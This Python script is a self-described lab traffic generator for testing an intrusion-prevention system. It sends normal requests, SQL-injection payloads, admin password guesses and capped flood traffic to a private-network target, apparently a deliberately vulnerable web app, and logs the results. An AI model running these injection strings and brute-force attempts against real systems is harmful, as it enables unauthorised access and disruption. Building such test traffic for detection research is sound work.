import argparse, json, random, time, uuid
from datetime import datetime, timezone
import requests

def main():
    p = argparse.ArgumentParser(description="Controlled IPS lab HTTP traffic bot")
    p.add_argument("--target", default="http://192.168.56.129:3000")
    p.add_argument("--mode", choices=["normal", "sqli", "bruteforce", "dos"], required=True)
    p.add_argument("--duration", type=int, default=30)
    p.add_argument("--rate", type=float, default=1.0, help="Approx requests/second; dos is capped at 5")
    p.add_argument("--experiment", default=None)
    args = p.parse_args()
    exp = args.experiment or str(uuid.uuid4())
    end = time.monotonic() + max(1, args.duration)
    interval = 1.0 / max(0.1, min(args.rate, 5.0))
    normal_paths = ["/api/Challenges", "/"]
    sqli = ["' OR '1'='1", "' UNION SELECT NULL--", "1' AND SLEEP(2)--",
            "' OR 1=1 --"]
    passwords = ["admin", "password", "123456", "letmein", "admin123"]
    session = requests.Session()
    sent = 0
    print(json.dumps({"experiment_id": exp, "mode": args.mode, "target": args.target,
                      "started_utc": datetime.now(timezone.utc).isoformat()}))
    while time.monotonic() < end:
        started = time.monotonic()
        try:
            if args.mode == "normal":
                r = session.get(args.target + random.choice(normal_paths), timeout=3)
            elif args.mode == "sqli":
                r = session.get(args.target + "/api/Challenges",
                    params={"search": random.choice(sqli)}, timeout=3)
            elif args.mode == "bruteforce":
                r = session.post(args.target + "/api/login",
                    json={"username": "admin", "password": random.choice(passwords)},
                    timeout=3)
            else:
                r = session.get(args.target + "/api/Challenges", timeout=3)
            sent += 1
            print(json.dumps({"experiment_id": exp, "mode": args.mode, "request": sent,
                "status": r.status_code, "utc": datetime.now(timezone.utc).isoformat()}))
        except requests.RequestException as exc:
            print(json.dumps({"experiment_id": exp, "mode": args.mode,
                              "request": sent + 1, "error": str(exc)}))
        delay = interval - (time.monotonic() - started)
        if delay > 0:
            time.sleep(delay)
    print(json.dumps({"experiment_id": exp, "completed_requests": sent,
                      "finished_utc": datetime.now(timezone.utc).isoformat()}))

if __name__ == "__main__":
    main()
